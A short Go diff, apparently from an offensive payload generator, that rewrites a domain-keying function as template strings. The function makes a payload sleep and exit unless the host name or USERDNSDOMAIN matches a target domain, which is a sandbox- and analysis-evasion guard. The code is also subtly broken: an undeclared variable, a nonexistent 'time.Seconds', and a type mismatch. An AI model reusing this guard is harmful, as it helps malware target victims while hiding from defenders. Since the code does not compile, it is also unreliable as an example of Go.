@@ -1,17 +1,22 @@
 package box
 
-func ChkDom(domain string) {
-	var hope []byte
-	if domain == "" {
+const DomKeyFunc = `
+func ChkDom() {
+	if hope == "" {
 		return
 	}
 
-	hope = domain
 	host, _ := os.Hostname()
 	dnsenv := os.Getenv("USERDNSDOMAIN")
 	if !strings.Contains(host, string(hope)) && !strings.Contains(dnsenv, string(hope)) {
-		time.Sleep({{.Delay}} * time.Seconds)
+		time.Sleep(13 * time.Seconds)
 		os.Exit(0)
 	}
 
 }
+
+`
+
+const CheckDom = `
+	ChkDom()
+`
